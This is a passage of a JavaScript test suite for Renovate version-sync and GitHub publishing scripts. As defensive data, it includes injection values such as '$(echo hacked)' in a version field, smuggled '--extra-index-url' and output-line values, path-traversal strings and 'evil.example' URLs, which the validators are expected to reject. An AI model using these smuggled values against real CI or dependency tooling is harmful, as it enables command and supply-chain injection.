import assert from 'node:assert/strict';
import childProcess from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { test } from 'node:test';

import { parseColonEnv, resolveRepoPath } from '../readmes/render-readmes.mjs';
import { api, assertRenovatePullRequest, buildGitHubRequest, dockerCliDocuments, gitBlobSha, pmdDocuments, prepare, publish, regenerateNextjsLock, selectGeneratedUpdates, validateFrameworkTree, validateNextjsChange, validateVersionChange } from './renovate-framework-sync.mjs';
import { frameworkVersionKeys, generatedFrameworkPaths, generatedNextjsPaths } from './sync-framework-versions.mjs';
import { pythonLockVersionKeys, ruffInputs } from './sync-django-versions.mjs';
import { temporaryDirectory } from '../test-helpers.mjs';
import { dashboardPackageVersions } from './image-tags.mjs';
import { documentedActionPaths } from '../ci/workflow-action-versions.mjs';
import { dockerCliDockerfile, readDockerCliVersion } from './docker-cli-version.mjs';
import { formatPmdLock, pmdLock, pmdPom, readPmdVersion } from './sync-pmd-version.mjs';
import {
  pythonRuntimeLocks, regeneratePythonRuntimeLocks, runtimeLockCompileArgs, validatePythonLockChange,
} from './python-lock-relay.mjs';

const config = JSON.parse(readFileSync(resolveRepoPath('renovate.json'), 'utf8'));
const env = readFileSync(resolveRepoPath('compose/.env'), 'utf8');
const managers = config.customManagers.filter((manager) => manager.managerFilePatterns.includes('/^compose\\/\\.env$/'));

test('Renovate extracts each active env pin once with the correct registry coordinates', () => {
  const expected = {
    MAVEN_VERSION: ['maven', 'org.apache.maven:apache-maven'],
    SPRING_BOOT_VERSION: ['maven', 'org.springframework.boot:spring-boot-dependencies'],
    QUARKUS_VERSION: ['maven', 'io.quarkus.platform:quarkus-bom'],
    MICRONAUT_VERSION: ['maven', 'io.micronaut:micronaut-core-bom'],
    HELIDON_VERSION: ['maven', 'io.helidon:helidon-bom'],
    SPARK_VERSION: ['maven', 'org.zoomba-lang:spark-core'],
    JAVALIN_VERSION: ['maven', 'io.javalin:javalin'],
    DROPWIZARD_VERSION: ['maven', 'io.dropwizard:dropwizard-dependencies'],
    VERTX_VERSION: ['maven', 'io.vertx:vertx-stack-depchain'],
    PEKKO_VERSION: ['maven', 'org.apache.pekko:pekko-http_3'],
    PEKKO_CORE_VERSION: ['maven', 'org.apache.pekko:pekko-stream_3'],
    GO_VERSION: ['golang-version', 'go'],
    PYTHON_VERSION: ['github-tags', 'python/cpython'],
    DJANGO_VERSION: ['pypi', 'django'],
    GUNICORN_VERSION: ['pypi', 'gunicorn'],
    RUFF_VERSION: ['pypi', 'ruff'],
  };
  assert.equal(managers.length, 17);
  const variables = parseColonEnv(env);
  for (const [key, [datasource, name]] of Object.entries(expected)) {
    const manager = managers.find(({ depNameTemplate }) => depNameTemplate === name);
    assert.equal(manager.datasourceTemplate, datasource);
    const expression = new RegExp(manager.matchStrings[0], 'g');
    for (const sample of [env, env.replaceAll('\r\n', '\n').replaceAll('\n', '\r\n'), `#${key}: 0.0.0\n${key}: ${variables[key]}\n`]) {
      const matches = [...sample.matchAll(expression)];
      assert.equal(matches.length, 1, key);
      assert.equal(matches[0].groups.currentValue, variables[key]);
    }
    const sample = `${key}: ${variables[key]}\n`;
    const updated = sample.replace(expression, (match) => match.replace(variables[key], '99.0.1'));
    assert.equal(updated, `${key}: 99.0.1\n`);
    assert.equal([...`#${key}: 0.0.0\n`.matchAll(expression)].length, 0);
  }
  assert.ok(config.customManagers.some(({ depNameTemplate, matchStrings }) => !depNameTemplate && matchStrings.some((pattern) => pattern.includes('qodana-python-community'))));
});

test('only env-driven downstream versions are disabled; existing safeguards remain', () => {
  const rules = config.packageRules.filter(({ enabled }) => enabled === false);
  assert.ok(rules.every(({ matchManagers, matchFileNames }) => matchManagers.length && matchFileNames.length));
  const maven = rules.find(({ matchManagers }) => matchManagers.includes('maven'));
  assert.ok(maven.matchPackageNames.includes('org.apache.pekko:pekko-http_3'));
  assert.ok(maven.matchPackageNames.includes('org.apache.pekko:pekko-stream_3'));
  assert.ok(maven.matchPackageNames.includes('org.apache.pekko:pekko-slf4j_3'));
  assert.ok(maven.matchPackageNames.includes('io.quarkus:quarkus-extension-processor'));
  for (const variant of ['jvm', 'native']) {
    const pom = readFileSync(resolveRepoPath(`services/java/quarkus/${variant}/pom.xml`), 'utf8');
    assert.match(pom, /<groupId>io\.quarkus<\/groupId>\s*<artifactId>quarkus-extension-processor<\/artifactId>\s*<version>\$\{quarkus.platform.version}<\/version>/);
  }
  assert.ok(!maven.matchPackageNames.some((pattern) => pattern.includes('micronaut-micrometer')));
  const go = rules.find(({ matchManagers }) => matchManagers.includes('gomod'));
  assert.deepEqual(go.matchDepTypes, ['golang']);
  const docker = rules.find(({ matchPackageNames }) => matchPackageNames?.includes('golang'));
  assert.ok(!docker.matchUpdateTypes.includes('digest') && !docker.matchUpdateTypes.includes('pinDigest'));
  const source = config.packageRules.find(({ matchFileNames }) => matchFileNames?.includes('compose/.env'));
  assert.equal(source.rebaseWhen, 'behind-base-branch');
  assert.deepEqual(config.gitIgnoredAuthors, ['41898282+github-actions[bot]@users.noreply.github.com']);
  assert.ok(config.packageRules.some(({ matchUpdateTypes, dependencyDashboardApproval }) => matchUpdateTypes?.includes('major') && dependencyDashboardApproval));
  assert.equal(config.automerge, false);
  assert.equal(config.vulnerabilityAlerts.minimumReleaseAge, '0 days');
});

test('release-age gates preserve registry policies and scope GitHub tags to CPython', () => {
  const ageRules = config.packageRules.filter(({ minimumReleaseAge }) => minimumReleaseAge !== undefined);
  const registry = ageRules.find(({ matchDatasources }) => matchDatasources?.includes('npm'));
  assert.deepEqual(registry.matchDatasources, ['npm', 'pypi', 'maven', 'go', 'golang-version', 'node-version', 'rubygems']);
  assert.equal(registry.minimumReleaseAge, '2 days');
  assert.equal(registry.minimumReleaseAgeBehaviour, 'timestamp-required');
  const githubTags = ageRules.filter(({ matchDatasources }) => matchDatasources?.includes('github-tags'));
  assert.equal(githubTags.length, 1);
  assert.deepEqual(githubTags[0].matchDatasources, ['github-tags']);
  assert.deepEqual(githubTags[0].matchPackageNames, ['python/cpython']);
  assert.equal(githubTags[0].minimumReleaseAge, '2 days');
  assert.equal(githubTags[0].minimumReleaseAgeBehaviour, 'timestamp-required');
});

test('only active version values may change, preserving local settings and comments', () => {
  const updated = env.replace(/(^QUARKUS_VERSION:)[^\r\n]+/m, '$1 9.0.1');
  assert.deepEqual(validateVersionChange(env, updated), ['QUARKUS_VERSION']);
  assert.deepEqual(validateVersionChange(env, env), []);
  assert.deepEqual(validateVersionChange(env, env.replace(/^PEKKO_CORE_VERSION:.*$/m, 'PEKKO_CORE_VERSION: 9.0.1')), ['PEKKO_CORE_VERSION']);
  assert.throws(() => validateVersionChange(env, `${updated}\nORCH_API_KEY: another\n`), /only active/);
  assert.throws(() => validateVersionChange(env, updated.replace('HOST_REPO:', 'OTHER_REPO:')), /only active/);
  assert.throws(() => validateVersionChange(env, `${env}\nQUARKUS_VERSION: 9.0.1\n`), /one literal/);
  assert.throws(() => validateVersionChange(env, env.replace(/(^QUARKUS_VERSION:)[^\r\n]+/m, '$1 $(echo hacked)')), /one literal/);
  for (const version of ['0.0.1', '9.0.1-RC_1']) {
    assert.deepEqual(validateVersionChange(env, env.replace(/(^QUARKUS_VERSION:)[^\r\n]+/m, `$1 ${version}`)), ['QUARKUS_VERSION']);
  }
  for (const version of ['v9.0.1', '\u0669.0.1']) {
    assert.throws(() => validateVersionChange(env, env.replace(/(^QUARKUS_VERSION:)[^\r\n]+/m, `$1 ${version}`)), /one literal/);
  }
  for (const key of frameworkVersionKeys) {
    assert.throws(() => validateVersionChange(env, env.replace(new RegExp(`^${key}:.*\\r?\\n?`, 'm'), '')), /one literal/);
  }
});

test('publisher accepts only same-repository open Renovate branches at the expected base', () => {
  const repository = 'owner/repo';
  const sha = 'a'.repeat(40);
  const pr = { state: 'open', user: { login: 'renovate[bot]' }, head: { sha: 'b'.repeat(40), ref: 'renovate/framework', repo: { full_name: repository } }, base: { sha, repo: { full_name: repository } } };
  assert.doesNotThrow(() => assertRenovatePullRequest(pr, repository, sha));
  for (const invalid of [
    { ...pr, state: 'closed' }, { ...pr, user: { login: 'contributor' } },
    { ...pr, head: { ...pr.head, repo: { full_name: 'fork/repo' } } },
    { ...pr, head: { ...pr.head, ref: 'main' } }, { ...pr, base: { ...pr.base, sha: 'c'.repeat(40) } },
  ]) assert.throws(() => assertRenovatePullRequest(invalid, repository, sha), /same-repository/);
  assert.doesNotThrow(() => assertRenovatePullRequest({ ...pr, head: { ...pr.head, ref: 'renovate/maven/framework-4.x' } }, repository, sha));
  assert.throws(() => assertRenovatePullRequest({ ...pr, head: { ...pr.head, ref: 'renovate/../other' } }, repository, sha), /valid Renovate branch/);
  assert.throws(() => assertRenovatePullRequest({ ...pr, head: { ...pr.head, sha: `${sha}?ref=main` } }, repository, sha), /full Git SHA/);
  assert.throws(() => assertRenovatePullRequest({ ...pr, base: { ...pr.base, sha: `${sha}\n` } }, repository, `${sha}\n`), /full Git SHA/);
});

test('GitHub request operations have fixed endpoints, methods and query strings', () => {
  const sha = 'a'.repeat(40);
  const cases = [
    ['readPull', 424, 'GET', 'pulls/424'],
    ['readCommit', sha, 'GET', `git/commits/${sha}`],
    ['readTree', sha, 'GET', `git/trees/${sha}?recursive=1`],
    ['readBlob', sha, 'GET', `git/blobs/${sha}`],
    ['createBlob', undefined, 'POST', 'git/blobs'],
    ['createTree', undefined, 'POST', 'git/trees'],
    ['createCommit', undefined, 'POST', 'git/commits'],
    ['updateRef', 'renovate/maven/framework-4.x', 'PATCH', 'git/refs/heads/renovate%2Fmaven%2Fframework-4.x'],
  ];
  for (const [operation, identifier, method, route] of cases) {
    const request = buildGitHubRequest(operation, 'Owner/repo.name', identifier);
    assert.deepEqual(request, { url: `https://api.github.com/repos/Owner/repo.name/${route}`, method });
    const url = new URL(request.url);
    assert.equal(url.origin, 'https://api.github.com');
    assert.ok(url.pathname.startsWith('/repos/Owner/repo.name/'));
    assert.equal(url.hash, '');
    assert.equal(url.search, operation === 'readTree' ? '?recursive=1' : '');
  }
});

test('every dynamic URL component uses standard encoding once, without encoding fixed route syntax', (t) => {
  const encode = globalThis.encodeURIComponent;
  const sanitizer = t.mock.method(globalThis, 'encodeURIComponent', (value) => encode(value));
  const sha = 'a'.repeat(40);
  const ref = 'renovate/maven/framework-4.x';
  for (const [operation, identifier, expectedIdentifier] of [
    ['readPull', 424, '424'],
    ['readCommit', sha, sha],
    ['readTree', sha, sha],
    ['readBlob', sha, sha],
    ['updateRef', ref, ref],
    ['createBlob', undefined, undefined],
    ['createTree', undefined, undefined],
    ['createCommit', undefined, undefined],
  ]) {
    const before = sanitizer.mock.callCount();
    const request = buildGitHubRequest(operation, 'Owner/repo.name', identifier);
    const encodedInputs = sanitizer.mock.calls.slice(before).map(({ arguments: args }) => args[0]);
    assert.deepEqual(encodedInputs, ['Owner', 'repo.name', ...(expectedIdentifier === undefined ? [] : [expectedIdentifier])], operation);
    const url = new URL(request.url);
    assert.ok(url.pathname.startsWith('/repos/Owner/repo.name/'));
    assert.equal(url.search, operation === 'readTree' ? '?recursive=1' : '');
    assert.equal(url.hash, '');
    assert.ok(!url.pathname.includes('%252F'), 'Do not double-encode the ref');
    if (operation === 'updateRef') assert.equal(url.pathname, '/repos/Owner/repo.name/git/refs/heads/renovate%2Fmaven%2Fframework-4.x');
  }
});

test('GitHub request construction rejects alternate routes, traversal and query injection', () => {
  const sha = 'a'.repeat(40);
  for (const repository of [undefined, null, {}, '', '.', '..', 'owner/.', 'owner/..', 'owner/repo/extra',
    'owner/repo?x=1', 'owner/repo#fragment', 'owner/repo%2fissues', 'owner\\repo',
    'https://evil.example/repo', '//evil.example/repo', 'owner/repo\n', 'owner/repo\r\n', 'owner/repo ']) {
    assert.throws(() => buildGitHubRequest('readPull', repository, 424), /owner\/repository/);
  }
  for (const identifier of [undefined, null, {}, '424', '424/../issues', 0, -1, 1.2, NaN, Infinity, Number.MAX_SAFE_INTEGER + 1]) {
    assert.throws(() => buildGitHubRequest('readPull', 'owner/repo', identifier), /positive PR number/);
  }
  for (const operation of ['readCommit', 'readTree', 'readBlob']) {
    for (const identifier of [undefined, null, {}, '', 'a'.repeat(39), 'a'.repeat(41), 'g'.repeat(40),
      '../issues', `${sha}/../../issues`, `${sha}?recursive=0`, `${sha}#fragment`,
      `${sha}%2f..`, `${sha}\n`, `${sha}\r\n`, ` ${sha}`, 'https://evil.example']) {
      assert.throws(() => buildGitHubRequest(operation, 'owner/repo', identifier), /full Git SHA/);
    }
  }
  for (const identifier of [undefined, null, {}, '', 'main', 'renovate/', 'renovate/../main', 'renovate/branch..name',
    'renovate/foo/../../main', 'renovate//branch', 'renovate/foo?x=1', 'renovate/foo#fragment',
    'renovate/foo%2f..', 'renovate/foo%252f..', 'renovate/foo\\bar', 'renovate/foo.lock', 'renovate/foo.lock/bar',
    'renovate/.hidden', 'renovate/foo.', 'renovate/foo\n', 'renovate/foo\r\n']) {
    assert.throws(() => buildGitHubRequest('updateRef', 'owner/repo', identifier), /valid Renovate branch/);
  }
  for (const operation of [undefined, '__proto__', 'constructor', 'git/blobs', 'https://evil.example', 'readTree?recursive=0']) {
    assert.throws(() => buildGitHubRequest(operation, 'owner/repo', sha), /Unsupported GitHub API operation/);
  }
});

function setRepository(t, repository = 'owner/repo') {
  const original = process.env.GITHUB_REPOSITORY;
  process.env.GITHUB_REPOSITORY = repository;
  t.after(() => {
    if (original === undefined) delete process.env.GITHUB_REPOSITORY;
    else process.env.GITHUB_REPOSITORY = original;
  });
}

test('authenticated fetch uses the fixed operation, rejects redirects and preserves publication body', async (t) => {
  setRepository(t);
  const sha = 'a'.repeat(40);
  const body = { sha, force: false };
  const mock = t.mock.method(globalThis, 'fetch', async (url, options) => {
    assert.equal(url, 'https://api.github.com/repos/owner/repo/git/refs/heads/renovate%2Fmaven%2Fframework-4.x');
    assert.equal(options.method, 'PATCH');
    assert.equal(options.redirect, 'error');
    assert.equal(options.headers.Authorization, 'Bearer synthetic-test-token');
    assert.deepEqual(JSON.parse(options.body), body);
    assert.ok(options.signal instanceof AbortSignal);
    return new Response(JSON.stringify({ ref: 'refs/heads/renovate/maven/framework-4.x' }), { status: 200 });
  });
  assert.deepEqual(await api('updateRef', 'synthetic-test-token', { identifier: 'renovate/maven/framework-4.x', body }), { ref: 'refs/heads/renovate/maven/framework-4.x' });
  assert.equal(mock.mock.callCount(), 1);
});

test('invalid API identifiers never reach the authenticated fetch boundary', async (t) => {
  setRepository(t);
  const mock = t.mock.method(globalThis, 'fetch', () => assert.fail('Invalid input must not send a request'));
  for (const operation of ['readPull', 'readCommit', 'readTree', 'readBlob', 'updateRef']) {
    for (const identifier of [undefined, null, {}, '../issues', '%2e%2e%2fissues', 'renovate/../main',
      'renovate/foo%2f..', 'renovate/foo%252f..', 'renovate/foo?x=1', 'renovate/foo#fragment',
      'renovate/foo\\bar', 'renovate/foo\n', 'renovate/foo\r\n', `${'a'.repeat(40)}?recursive=0`]) {
      await assert.rejects(api(operation, 'synthetic-test-token', { identifier }));
    }
  }
  await assert.rejects(api('git/blobs', 'synthetic-test-token'), /Unsupported/);
  for (const repository of ['owner/repo/../../other', 'owner/..', 'owner/repo%2fissues',
    'https://evil.example/repo', 'owner/repo?x=1', 'owner/repo#fragment', 'owner/repo\n']) {
    process.env.GITHUB_REPOSITORY = repository;
    for (const operation of ['createBlob', 'createTree', 'createCommit']) {
      await assert.rejects(api(operation, 'synthetic-test-token', { body: { content: 'test' } }), /owner\/repository/);
    }
  }
  await assert.rejects(api('readPull', '', { identifier: 424 }), /Missing GitHub token/);
  assert.equal(mock.mock.callCount(), 0);
});

test('response SHAs cannot inject later requests or become branch refs (Sonar S8476 flow)', async (t) => {
  setRepository(t);
  const sha = 'a'.repeat(40);
  for (const returned of ['../issues?state=all', `${sha}\n`, `${sha}%2f..`, `${sha}#fragment`, sha]) {
    const mock = t.mock.method(globalThis, 'fetch', async (url, options) => {
      assert.equal(url, `https://api.github.com/repos/owner/repo/git/commits/${sha}`);
      assert.equal(options.method, 'GET');
      assert.equal(options.redirect, 'error');
      return new Response(JSON.stringify({ tree: { sha: returned } }), { status: 200 });
    });
    const commit = await api('readCommit', 'synthetic-test-token', { identifier: sha });
    if (returned !== sha) await assert.rejects(api('readTree', 'synthetic-test-token', { identifier: commit.tree.sha }), /full Git SHA/);
    // The live Sonar flow passes a response tree SHA into updateRef. Even a valid
    // SHA is not a Renovate branch, and must fail before any PATCH is sent.
    await assert.rejects(api('updateRef', 'synthetic-test-token', { identifier: commit.tree.sha }), /valid Renovate branch/);
    assert.equal(mock.mock.callCount(), 1);
    mock.mock.restore();
  }
});

test('non-success and redirect API responses fail without a second request', async (t) => {
  setRepository(t);
  for (const status of [302, 403, 500]) {
    const mock = t.mock.method(globalThis, 'fetch', async (_url, options) => {
      assert.equal(options.redirect, 'error');
      return new Response(null, { status, headers: { Location: 'https://evil.example/' } });
    });
    await assert.rejects(api('readPull', 'synthetic-test-token', { identifier: 424 }), new RegExp(`readPull failed \\(${status}\\)`));
    assert.equal(mock.mock.callCount(), 1);
    mock.mock.restore();
  }
});

test('complete tree comparison ignores parent tree hashes, but rejects source edits, modes and symlinks', () => {
  const entries = new Map([
    ['compose', { type: 'tree', sha: 'old-tree', mode: '040000' }],
    ['compose/.env', { type: 'blob', sha: 'old-blob', mode: '100644' }],
    ['scripts/tool.mjs', { type: 'blob', sha: 'script', mode: '100644' }],
  ]);
  const head = new Map(entries);
  head.set('compose', { type: 'tree', sha: 'new-tree', mode: '040000' });
  head.set('compose/.env', { type: 'blob', sha: 'new-blob', mode: '100644' });
  const allowed = new Set(['compose/.env']);
  assert.doesNotThrow(() => validateFrameworkTree(entries, head, allowed));
  const sourceEdit = new Map(head).set('scripts/tool.mjs', { type: 'blob', sha: 'modified', mode: '100644' });
  assert.throws(() => validateFrameworkTree(entries, sourceEdit, allowed), /Unexpected file/);
  for (const mode of ['120000', '160000', '100755']) {
    assert.throws(() => validateFrameworkTree(entries, new Map(head).set('compose/.env', { type: 'blob', sha: 'new-blob', mode }), allowed), /regular file mode/);
  }
  assert.throws(() => validateFrameworkTree(entries, new Map(head).set('compose/.env', undefined), allowed), /regular file mode/);
});

function blobEntries(contents) {
  return new Map([...contents].map(([file, content]) => [file, { type: 'blob', mode: '100644', sha: gitBlobSha(content) }]));
}

test('Git blob hashes include the header and UTF-8 byte length', () => {
  assert.equal(gitBlobSha('hello\n'), 'ce013625030ba8dba906f756967f9e9ca394464a');
  assert.equal(gitBlobSha(''), 'e69de29bb2d1d6434b8b29ae775ad8c2e48c5391');
  assert.equal(gitBlobSha('caf\u00e9\n'), '572eb43fe8e34fb87d01c69e01151ff696022924');
  assert.notEqual(gitBlobSha('hello\r\n'), gitBlobSha('hello\n'));
});

test('generated updates are idempotent and never overwrite unrelated branch edits', () => {
  const files = [{ file: 'pom.xml', content: 'new' }];
  const base = blobEntries([['pom.xml', 'old']]);
  assert.deepEqual(selectGeneratedUpdates(files, base, base), files);
  assert.deepEqual(selectGeneratedUpdates(files, base, blobEntries([['pom.xml', 'new']])), []);
  assert.throws(() => selectGeneratedUpdates(files, base, blobEntries([['pom.xml', 'custom']])), /overwrite a PR edit/);
  assert.deepEqual(selectGeneratedUpdates([{ file: 'pom.xml', content: 'old' }], base, base), []);
});

test('hash-based no-op selection still rejects missing files, symlinks and changed modes', () => {
  const files = [{ file: 'pom.xml', content: 'same' }];
  const base = blobEntries([['pom.xml', 'same']]);
  for (const invalid of [undefined, { ...base.get('pom.xml'), type: 'tree' },
    ...['120000', '160000', '100755'].map((mode) => ({ ...base.get('pom.xml'), mode }))]) {
    assert.throws(() => selectGeneratedUpdates(files, base, new Map([['pom.xml', invalid]])), /regular tracked file|regular file mode/);
  }
  assert.throws(() => selectGeneratedUpdates(files, new Map(), base), /regular tracked file/);
  assert.throws(() => selectGeneratedUpdates(files, base, new Map([['pom.xml', { ...base.get('pom.xml'), sha: '../issues' }]])), /full Git SHA/);
  const executable = new Map([['pom.xml', { ...base.get('pom.xml'), mode: '100755' }]]);
  assert.deepEqual(selectGeneratedUpdates([{ file: 'pom.xml', content: 'new' }], executable, executable), [{ file: 'pom.xml', content: 'new' }]);
});

function publicationFixture(t, onWrite = (route) => assert.fail(`Unexpected request: ${route}`), onPublicRequest = (url) => assert.fail(`Unexpected public request: ${url}`)) {
  setRepository(t);
  const originalTemp = process.env.RUNNER_TEMP;
  const originalToken = process.env.RENOVATE_SYNC_TOKEN;
  process.env.RUNNER_TEMP = temporaryDirectory(t, 'framework-publish-');
  process.env.RENOVATE_SYNC_TOKEN = 'synthetic-write-token';
  t.after(() => {
    if (originalTemp === undefined) delete process.env.RUNNER_TEMP;
    else process.env.RUNNER_TEMP = originalTemp;
    if (originalToken === undefined) delete process.env.RENOVATE_SYNC_TOKEN;
    else process.env.RENOVATE_SYNC_TOKEN = originalToken;
  });
  const state = { number: 424, baseSha: 'a'.repeat(40), headSha: 'b'.repeat(40), ref: 'renovate/framework', changed: ['QUARKUS_VERSION'] };
  writeFileSync(path.join(process.env.RUNNER_TEMP, 'renovate-framework-sync.json'), JSON.stringify(state));
  const head = blobEntries([...new Set(generatedFrameworkPaths())].map((file) => [file, readFileSync(resolveRepoPath(file), 'utf8')]));
  const base = new Map(head);
  base.set('services/java/quarkus/jvm/pom.xml', { ...head.get('services/java/quarkus/jvm/pom.xml'), sha: gitBlobSha('before synchronization') });
  const baseTreeSha = 'c'.repeat(40);
  const headTreeSha = 'd'.repeat(40);
  const mock = t.mock.method(globalThis, 'fetch', async (url, options) => {
    assert.equal(options.redirect, 'error');
    if (options.headers.Authorization === undefined) {
      return new Response(JSON.stringify(onPublicRequest(url, options)), { status: 200 });
    }
    assert.equal(options.headers.Authorization, options.method === 'GET' ? 'Bearer synthetic-test-token' : 'Bearer synthetic-write-token');
    const route = url.replace('https://api.github.com/repos/owner/repo/', '');
    let response;
    if (route === 'pulls/424') {
      response = { state: 'open', user: { login: 'renovate[bot]' },
        base: { sha: state.baseSha, repo: { full_name: 'owner/repo' } },
        head: { sha: state.headSha, ref: state.ref, repo: { full_name: 'owner/repo' } } };
    } else if (route === `git/commits/${state.baseSha}`) response = { tree: { sha: baseTreeSha } };
    else if (route === `git/commits/${state.headSha}`) response = { tree: { sha: headTreeSha } };
    else if (route === `git/trees/${baseTreeSha}?recursive=1`) response = { tree: [...base].map(([file, entry]) => ({ path: file, ...entry })) };
    else if (route === `git/trees/${headTreeSha}?recursive=1`) response = { tree: [...head].map(([file, entry]) => ({ path: file, ...entry })) };
    else response = await onWrite(route, options);
    return new Response(JSON.stringify(response), { status: 200 });
  });
  return { state, base, head, headTreeSha, mock };
}

test('repeat publication performs only PR/tree reads, with no blob downloads or writes', async (t) => {
  const { mock } = publicationFixture(t);
  await publish('synthetic-test-token');
  assert.equal(mock.mock.callCount(), 5);
});

function markPendingUpdates(base, head) {
  const files = ['services/java/quarkus/jvm/pom.xml', 'services/java/quarkus/native/pom.xml'];
  for (const file of files) {
    const entry = { ...base.get(file), sha: gitBlobSha('before synchronization'), mode: '100755' };
    base.set(file, entry);
    head.set(file, entry);
  }
  return files;
}

test('publication uploads blobs sequentially before creating the tree, commit and non-forced ref', async (t) => {
  const writes = [];
  const blobShas = ['e'.repeat(40), 'f'.repeat(40)];
  const treeSha = '1'.repeat(40);
  const commitSha = '2'.repeat(40);
  let activeUploads = 0;
  let completedUploads = 0;
  const { state, base, head, headTreeSha } = publicationFixture(t, async (route, options) => {
    const body = JSON.parse(options.body);
    writes.push({ route, method: options.method, body });
    if (route === 'git/blobs') {
      assert.equal(++activeUploads, 1, 'Only one blob upload may be in flight');
      await new Promise((resolve) => setImmediate(resolve));
      activeUploads -= 1;
      return { sha: blobShas[completedUploads++] };
    }
    assert.equal(completedUploads, 2, 'All uploads must finish before publication continues');
    if (route === 'git/trees') return { sha: treeSha };
    if (route === 'git/commits') return { sha: commitSha };
    assert.equal(route, 'git/refs/heads/renovate%2Fframework');
    return {};
  });
  const files = markPendingUpdates(base, head);
  await publish('synthetic-test-token');
  assert.deepEqual(writes, [
    ...files.map((file) => ({ route: 'git/blobs', method: 'POST', body: {
      content: Buffer.from(readFileSync(resolveRepoPath(file), 'utf8')).toString('base64'), encoding: 'base64',
    } })),
    { route: 'git/trees', method: 'POST', body: { base_tree: headTreeSha, tree: files.map((file, index) => ({
      path: file, mode: '100755', type: 'blob', sha: blobShas[index],
    })) } },
    { route: 'git/commits', method: 'POST', body: {
      message: 'chore: relay framework versions from compose/.env', tree: treeSha, parents: [state.headSha],
      author: { name: 'github-actions[bot]', email: '41898282+github-actions[bot]@users.noreply.github.com' },
    } },
    { route: 'git/refs/heads/renovate%2Fframework', method: 'PATCH', body: { sha: commitSha, force: false } },
  ]);
});

test('an invalid blob response stops subsequent uploads and publication', async (t) => {
  const writes = [];
  const { base, head, mock } = publicationFixture(t, (route) => {
    writes.push(route);
    return { sha: '../invalid-sha' };
  });
  markPendingUpdates(base, head);
  await assert.rejects(publish('synthetic-test-token'), /full Git SHA/);
  assert.deepEqual(writes, ['git/blobs']);
  assert.equal(mock.mock.callCount(), 6);
});

const apmPinPath = 'scripts/apm-version.txt';
const apmLockPath = 'my-agent/apm.lock.yaml';
const refreshedApmLock = 'lockfile_version: \'4\'\napm_version: 0.38.1\ndependencies: []\n';

function apmFixture(t, onWrite = (route) => assert.fail(`Unexpected write: ${route}`)) {
  const blobs = new Map();
  const fixture = publicationFixture(t, (route, options) => {
    if (options.method !== 'GET') return onWrite(route, JSON.parse(options.body));
    const content = blobs.get(route.slice('git/blobs/'.length));
    assert.ok(content, route);
    return { encoding: 'base64', content: Buffer.from(content).toString('base64') };
  });
  const { base, head, state } = fixture;
  for (const [file, entry] of base) head.set(file, entry);
  const add = (tree, file, content, mode = '100644') => {
    const sha = gitBlobSha(content);
    blobs.set(sha, content);
    tree.set(file, { mode, sha, type: 'blob' });
  };
  add(base, apmPinPath, '0.37.0\n');
  add(base, apmLockPath, refreshedApmLock.replace('0.38.1', '0.37.0'));
  head.set(apmLockPath, base.get(apmLockPath));
  add(head, apmPinPath, '0.38.1\r\n');
  const output = path.join(process.env.RUNNER_TEMP, 'output');
  const settings = { GITHUB_OUTPUT: output, APM_GENERATED_LOCK: Buffer.from(refreshedApmLock).toString('base64'),
    APM_GENERATED_HEAD_SHA: state.headSha };
  for (const [name, value] of Object.entries(settings)) {
    const previous = process.env[name];
    process.env[name] = value;
    t.after(() => {
      if (previous === undefined) delete process.env[name];
      else process.env[name] = previous;
    });
  }
  const event = { number: state.number, pull_request: { base: { sha: state.baseSha } } };
  return { ...fixture, output, change: (file, content, mode) => add(head, file, content, mode),
    prepareApm: () => prepare(event, 'synthetic-test-token', 'apm') };
}

test('only the APM CLI pin gets the APM relay label and remains manual to merge', () => {
  const rules = config.packageRules.filter((rule) => rule.addLabels?.includes('apm-version'));
  assert.equal(rules.length, 1);
  assert.deepEqual(rules[0].matchManagers, ['custom.regex']);
  assert.deepEqual(rules[0].matchFileNames, [apmPinPath]);
  assert.deepEqual(rules[0].matchPackageNames, ['apm-cli']);
  assert.equal(rules[0].automerge, false);
});

test('APM relay publishes only the generated lockfile and a repeat publication is a no-op', async (t) => {
  const writes = [];
  const { state, headTreeSha, change, prepareApm, output } = apmFixture(t, (route, body) => {
    writes.push({ route, body });
    return { sha: 'f'.repeat(40) };
  });
  await prepareApm();
  assert.match(readFileSync(output, 'utf8'), new RegExp(`apm_version=0\\.38\\.1\\nhead_sha=${state.headSha}\\n`));
  await publish('synthetic-test-token');
  assert.deepEqual(writes.map(({ route }) => route), ['git/blobs', 'git/trees', 'git/commits', 'git/refs/heads/renovate%2Fframework']);
  assert.deepEqual(writes[0].body, { encoding: 'base64', content: Buffer.from(refreshedApmLock).toString('base64') });
  assert.deepEqual(writes[1].body, { base_tree: headTreeSha, tree: [
    { path: apmLockPath, mode: '100644', type: 'blob', sha: 'f'.repeat(40) },
  ] });
  assert.deepEqual(writes[2].body.parents, [state.headSha]);
  assert.equal(writes[3].body.force, false);
  change(apmLockPath, refreshedApmLock);
  await prepareApm();
  await publish('synthetic-test-token');
  assert.equal(writes.length, 4);
});

test('APM preparation rejects source edits, pin injection, and changed file modes', async (t) => {
  const { base, head, change, prepareApm, output } = apmFixture(t);
  change('scripts/upgrade-apm.py', 'edited source');
  await assert.rejects(prepareApm(), /Unexpected file/);
  head.delete('scripts/upgrade-apm.py');
  change(apmLockPath, 'redirected lock', '120000');
  await assert.rejects(prepareApm(), /unchanged regular file mode/);
  head.set(apmLockPath, base.get(apmLockPath));
  for (const version of ['0.38.1\nhead_sha=injected', '0.38.1rc1', '0.38.1\n\n', '0.38.1 --extra-index-url=example.org']) {
    change(apmPinPath, version);
    await assert.rejects(prepareApm(), /exactly one stable APM CLI version/);
  }
  assert.equal(existsSync(output), false);
});

test('APM publication rejects stale, malformed, or conflicting lockfile handoffs before writes', async (t) => {
  const { state, change, prepareApm, mock } = apmFixture(t);
  process.env.APM_GENERATED_HEAD_SHA = 'e'.repeat(40);
  await assert.rejects(prepareApm(), /PR head changed after APM generation/);
  assert.equal(mock.mock.callCount(), 1);
  process.env.APM_GENERATED_HEAD_SHA = state.headSha;
  await prepareApm();
  process.env.APM_GENERATED_LOCK = 'not base64';
  await assert.rejects(publish('synthetic-test-token'), /Invalid generated APM lockfile encoding/);
  process.env.APM_GENERATED_LOCK = Buffer.from(refreshedApmLock.replace('0.38.1', '0.37.0')).toString('base64');
  await assert.rejects(publish('synthetic-test-token'), /does not match the proposed CLI version/);
  process.env.APM_GENERATED_LOCK = Buffer.from(refreshedApmLock).toString('base64');
  change(apmLockPath, 'manually edited lockfile');
